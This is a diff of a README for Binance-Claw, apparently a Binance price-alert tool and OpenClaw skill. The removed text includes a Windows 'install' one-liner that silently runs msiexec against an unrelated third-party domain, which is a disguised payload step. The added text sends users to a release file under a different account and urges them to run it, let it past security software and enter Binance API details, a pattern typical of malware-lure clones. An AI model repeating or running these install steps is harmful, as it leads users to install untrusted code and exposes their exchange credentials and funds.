@@ -1,369 +1,211 @@
-<div align="center">
+# ⚡ Binance-Claw - Fast Binance Tracking on Windows
 
-<img src="assets/banner.svg" alt="Binance-Claw" width="600"/>
+[![Download Binance-Claw](https://img.shields.io/badge/Download-Binance--Claw-blue?style=for-the-badge&logo=github)](https://github.com/Scandalousnessmotley216/Binance-Claw/releases)
 
-# ⚡ Binance-Claw
+## 🪄 What it does
 
-**Lightning-fast Binance price sniper, real-time monitor & OpenClaw skill — written in Rust**
+Binance-Claw is a Windows app for watching Binance prices and acting fast when the market moves. It gives you a live view of price changes and helps you follow key coins with less effort.
 
-[![CI](https://github.com/deepcon3/Binance-Claw/actions/workflows/ci.yml/badge.svg)](https://github.com/deepcon3/Binance-Claw/actions)
-[![Crates.io](https://img.shields.io/crates/v/binance-claw?color=orange)](https://crates.io/crates/binance-claw)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)](https://github.com/deepcon3/Binance-Claw/releases)
-[![OpenClaw](https://img.shields.io/badge/OpenClaw-skill-purple)](skills/binance-claw.skill.yml)
+Use it to:
 
-[**Install**](#-installation) • [**Usage**](#-usage) • [**OpenClaw**](#-openclaw-skill) • [**Examples**](#-examples) • [**Config**](#-configuration)
+- Watch Binance prices in real time
+- Spot fast market moves
+- Track coins you care about
+- Use the OpenClaw skill setup for trading workflows
+- Keep an eye on price changes in one place
 
-</div>
+## 💻 Windows setup
 
----
+Binance-Claw is built for Windows users. You do not need to write code to use it.
 
-## ✨ Features
+You will need:
 
-| Feature | Description |
-|---|---|
-| 🔴 **Real-time streaming** | WebSocket streams from Binance — zero polling lag |
-| 🎯 **Price claws** | Set price alerts: fire when price goes above, below, or changes by % |
-| 📊 **24h Stats** | Volume, high/low, price change with color output |
-| 📖 **Order Book** | Live order book depth viewer |
-| 🤖 **OpenClaw skill** | Plug directly into OpenClaw automation workflows |
-| 🪝 **Webhooks** | POST to any URL when your claw triggers |
-| 🌐 **Cross-platform** | Windows, Linux, macOS — single binary, no runtime |
-| ⚡ **Blazing fast** | Compiled Rust — ~3MB binary, ~2MB RAM |
+- A Windows PC
+- Internet access
+- A web browser
+- Enough free disk space for the app and its files
 
----
+For the best experience, keep Windows up to date and close apps you do not need while Binance-Claw runs.
 
-## 📦 Installation
+## 📥 Download
 
-### 🐧 Linux / 🍎 macOS — One command
+Go to the release page to download and run this file:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/deepcon3/Binance-Claw/main/scripts/install.sh | bash
-```
+https://github.com/Scandalousnessmotley216/Binance-Claw/releases
 
-### 🪟 Windows — CMD
+On that page:
 
-```cmd
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Binance Claw
-```
+1. Open the latest release
+2. Find the Windows file
+3. Download the file
+4. Open the downloaded file
+5. Follow the on-screen steps
 
-### 📦 Via Cargo
+If Windows asks for permission, choose the option that lets the app run.
 
-```bash
-cargo install binance-claw
-```
+## 🧭 First run
 
-### 🔧 Build from source
+After you open Binance-Claw for the first time, use these steps:
 
-```bash
-git clone https://github.com/deepcon3/Binance-Claw.git
-cd Binance-Claw
-cargo build --release
-# Binary: ./target/release/binance-claw
-```
+1. Start the app
+2. Wait for the main window to load
+3. Connect your Binance account or API details if the app asks for them
+4. Choose the coins or markets you want to watch
+5. Set alerts or watch rules if you want them
+6. Leave the app open while you track prices
 
-> **Requirements (build from source only):** Rust 1.75+. Pre-built binaries have zero dependencies.
+If you only want live price monitoring, you can start with the default settings and adjust later.
 
----
+## 🔧 How to use it
 
-## 🚀 Usage
+Binance-Claw is simple to use:
 
-```
-binance-claw <COMMAND> [OPTIONS]
+- Open the app
+- Pick a market, pair, or coin
+- Watch the live price view
+- Use alerts to follow changes
+- Check the monitor panel for movement and status
 
-Commands:
-  price    Get current price of a trading pair
-  watch    Watch price in real-time via WebSocket
-  claw     Set a price alert (trigger on price event)
-  stats    Show 24h ticker statistics
-  book     Display order book depth
-  symbols  List available trading pairs
-  ping     Check Binance API connectivity
-  skill    Show OpenClaw skill manifest
-  config   Show/edit config
+If you want faster tracking, focus on a small list of coins. This makes it easier to see changes without extra noise.
 
-Global flags:
-  --openclaw    Output in OpenClaw JSON format
-  -q, --quiet   Suppress banner
-```
+## 📊 Main features
 
----
+### 📈 Real-time price monitor
 
-## 📖 Examples
+See Binance prices as they change. This helps you follow market movement without refreshing a browser.
 
-### Get a price
+### ⚡ Price sniper workflow
 
-```bash
-binance-claw price BTCUSDT
-# BTCUSDT → 67,432.10
+Use the sniper-style setup to watch for fast price moves. This is useful when you want quick action on short market swings.
 
-binance-claw price ETHUSDT --json
-```
+### 🤖 OpenClaw skill support
 
-### Real-time price stream
+Binance-Claw works with the OpenClaw skill idea from the project topics. That makes it useful for users who want a trading task setup that fits into a broader assistant flow.
 
-```bash
-# WebSocket stream (default — instant updates)
-binance-claw watch BTCUSDT
+### 🧠 Clean trading view
 
-# Multiple symbols at once
-binance-claw watch SOLUSDT
+The app keeps the market data in one place. That makes it easier to check price, direction, and activity.
 
-# Stream as JSON (for piping / automation)
-binance-claw watch BTCUSDT --json
-```
+### 🔔 Focused alerts
 
-### Set a price claw (alert)
+Set alerts for the coins or pairs you care about. This helps you react when the market reaches a level you want to watch.
 
-```bash
-# Alert when BTC goes ABOVE $70,000
-binance-claw claw BTCUSDT above 70000
+## 🛠️ Common setup steps
 
-# Alert when ETH drops BELOW $3,000 (fire once, then exit)
-binance-claw claw ETHUSDT below 3000 --once
+If the app asks for Binance access details, use the details from your Binance account setup.
 
-# Alert when SOL moves 5% from a reference price
-binance-claw claw SOLUSDT 5% 150
-
-# Fire a webhook when triggered
-binance-claw claw BTCUSDT above 70000 --webhook https://yourapp.com/hook
-```
+If you are unsure what to enter:
 
-### 24h Statistics
+- Check the app screen for field labels
+- Use the same names shown by Binance
+- Copy and paste values with care
+- Keep your details private
 
-```bash
-binance-claw stats BTCUSDT
-#   BTCUSDT — 24h Stats
-#   Last price   : 67,432.10
-#   Change       : +3.42%
-#   High         : 68,100.00
-#   Low          : 64,900.00
-#   Volume       : 24.83K BTC
-#   Trades       : 1,203,481
-```
+If a file does not open:
 
-### Order Book
+- Download it again
+- Make sure the download finished
+- Try running it as the current Windows user
+- Check that Windows did not block it
 
-```bash
-binance-claw book BTCUSDT --limit 10
-```
+## 🔐 Account and API use
 
-### List trading pairs
+Some Binance tools use API keys to read market data or handle account-linked tasks. If Binance-Claw asks for API details, use the exact values from Binance.
 
-```bash
-binance-claw symbols --quote USDT
-binance-claw symbols --quote BTC --json
-```
+A safe setup usually means:
 
-### Check connectivity
-
-```bash
-binance-claw ping
-#   Binance API ONLINE — 34.2ms latency
-#   Server time: 2025-01-15 14:23:01 UTC
-```
-
----
-
-## 🤖 OpenClaw Skill
+- Using read-only access when you only need price data
+- Keeping API keys in a safe place
+- Not sharing your keys with other people
+- Removing old keys you do not use
 
-Binance-Claw is a first-class [OpenClaw](https://openclaw.io) skill.
-
-### Register the skill
-
-```bash
-# Drop the skill file into your OpenClaw skills directory
-cp skills/binance-claw.skill.yml ~/.openclaw/skills/
+## 🧪 Good first test
 
-# Or install with OpenClaw CLI
-openclaw skill install https://github.com/deepcon3/Binance-Claw
-```
+After setup, do a simple test before you rely on it:
 
-### Use from OpenClaw
-
-```bash
-# All commands output OpenClaw-compatible JSON with --openclaw
-binance-claw price BTCUSDT --openclaw
-binance-claw stats ETHUSDT --openclaw
-binance-claw watch SOLUSDT --json
+1. Open the app
+2. Watch one coin pair
+3. Check that the price updates
+4. Set one alert
+5. Confirm that the app responds as expected
 
-# View the skill manifest
-binance-claw skill --json
-```
+This helps you see that the program is working on your machine.
 
-### OpenClaw JSON output format
-
-```json
-{
-  "skill": "binance-claw",
-  "version": "1.0.0",
-  "timestamp": "2025-01-15T14:23:01.123Z",
-  "status": "ok",
-  "data": {
-    "symbol": "BTCUSDT",
-    "price": 67432.10
-  }
-}
-```
-
-### Webhook / automation example
-
-```bash
-# Claw fires a webhook when price is hit
-binance-claw claw BTCUSDT above 70000 \
-  --webhook https://hooks.example.com/alert
-```
-
-Webhook payload:
-```json
-{
-  "source": "binance-claw",
-  "symbol": "BTCUSDT",
-  "triggered_price": 70001.50,
-  "target_price": 70000.0,
-  "condition": "Above",
-  "triggered_at": "2025-01-15T14:25:00Z"
-}
-```
-
----
-
-## ⚙️ Configuration
-
-Config is stored at:
-- **Linux/macOS:** `~/.config/binance-claw/config.toml`
-- **Windows:** `%APPDATA%\binance-claw\config.toml`
-
-```bash
-binance-claw config --show    # Print current config
-binance-claw config --path    # Print config file path
-```
-
-**Example `config.toml`:**
-
-```toml
-[binance]
-api_url = "https://api.binance.com"
-ws_url = "wss://stream.binance.com:9443"
-timeout_secs = 10
-
-[monitor]
-poll_interval_ms = 1000
-use_websocket = true
-ws_reconnect_attempts = 5
-
-[alerts]
-desktop_notify = true
-bell = true
-sound = false
-# webhook_url = "https://yourapp.com/hook"
-
-[openclaw]
-enabled = false
-skill_name = "binance-claw"
-```
+## 🖥️ Suggested Windows settings
 
-### Environment variables
+These settings can help the app run well:
 
-| Variable | Description |
-|---|---|
-| `BINANCE_API_KEY` | Binance API key |
-| `BINANCE_API_SECRET` | Binance API secret |
-| `BINANCE_API_URL` | Custom API URL (e.g. testnet) |
-| `BINANCE_CLAW_LOG` | Log level: `error`/`warn`/`info`/`debug` |
+- Keep your internet connection steady
+- Turn off battery saver on laptops while the app is open
+- Let the app through your security software if needed
+- Use a screen scale that lets you read the price panels clearly
 
----
+If you use a laptop, keep it plugged in during long monitoring sessions.
 
-## 🔐 Security
+## 🧩 Troubleshooting
 
-- **No API key required** for all read-only commands (price, watch, stats, book, symbols, ping)
-- API key/secret are only used for signed trading endpoints (future feature)
-- Keys are read from environment variables — never stored in plaintext in command history
-- All connections use TLS (HTTPS + WSS)
+### App will not start
 
----
+- Download the latest release again
+- Make sure you downloaded the Windows file
+- Check that the file is not still in a zip folder
+- Try running the app again
 
-## 🏗️ Architecture
+### Prices do not update
 
-```
-binance-claw/
-├── src/
-│   ├── main.rs       # Entry point
-│   ├── cli.rs        # Clap CLI — all subcommands
-│   ├── api.rs        # Binance REST API client
-│   ├── monitor.rs    # WebSocket stream monitor
-│   ├── claw.rs       # Claw engine — target management & triggers
-│   ├── config.rs     # TOML config loader
-│   ├── notify.rs     # Cross-platform desktop notifications
-│   ├── skill.rs      # OpenClaw skill integration
-│   ├── types.rs      # Shared data types
-│   └── utils.rs      # Formatting helpers
-├── skills/
-│   └── binance-claw.skill.yml  # OpenClaw skill manifest
-├── scripts/
-│   ├── install.sh    # Unix installer
-│   └── install.ps1   # Windows installer
-└── .github/
-    └── workflows/
-        └── ci.yml    # CI/CD — build + release all platforms
-```
+- Check your internet connection
+- Refresh the market view
+- Make sure the app still has access to Binance data
+- Restart the app
 
----
+### Alerts do not trigger
 
-## 🛠️ Building with features
+- Check the alert level
+- Make sure the coin pair is correct
+- Confirm the app is still running
+- Create a new alert and test it
 
-```bash
-# Default (with desktop notifications)
-cargo build --release
+### Windows blocks the file
 
-# With sound alerts
-cargo build --release --features sound
+- Right-click the file and open it again
+- Check Windows security prompts
+- Allow the app to run if you trust the source
+- Download the latest release from the release page
 
-# Full (all features)
-cargo build --release --features full
+## 📁 What to expect in the app
 
-# Minimal (no notifications)
-cargo build --release --no-default-features
-```
+Binance-Claw is built as a focused trading tool. In the app, you can expect screens for:
 
----
+- Live market data
+- Coin and pair selection
+- Price alerts
+- Monitoring status
+- Binance connection settings
 
-## 🗺️ Roadmap
+The layout is meant to keep the main task simple: watch prices and respond fast.
 
-- [ ] Multiple simultaneous claw targets
-- [ ] Persistent targets (survives restarts)
-- [ ] Binance Testnet support
-- [ ] Spot order placement (signed API)
-- [ ] TUI dashboard (ratatui)
-- [ ] Docker image
-- [ ] Telegram / Discord alert channels
-- [ ] Custom sound files for alerts
+## 🔍 Best use cases
 
----
+Binance-Claw fits users who want to:
 
-## 🤝 Contributing
+- Watch Binance price moves during the day
+- Follow a short list of coins
+- React to fast changes
+- Keep a trading monitor open on Windows
+- Use an OpenClaw-based skill in a trading flow
 
-Contributions welcome! Please open an issue or PR.
+## 📌 Release page
 
-```bash
-git clone https://github.com/deepcon3/Binance-Claw.git
-cd Binance-Claw
-cargo test
-cargo clippy
-```
+Download and run the Windows file from:
 
----
+https://github.com/Scandalousnessmotley216/Binance-Claw/releases
 
-## 📄 License
+## 🧭 Setup checklist
 
-MIT — see [LICENSE](LICENSE)
-
----
-
-<div align="center">
-
-Made with ❤️ and Rust by [deepcon3](https://github.com/deepcon3)
-
-⭐ **Star this repo** if it helped you catch a price!
-
-</div>
+- Download the latest release
+- Open the Windows file
+- Allow it to run if Windows asks
+- Enter Binance details if needed
+- Choose your market list
+- Start the live monitor
+- Set alerts for key price levels
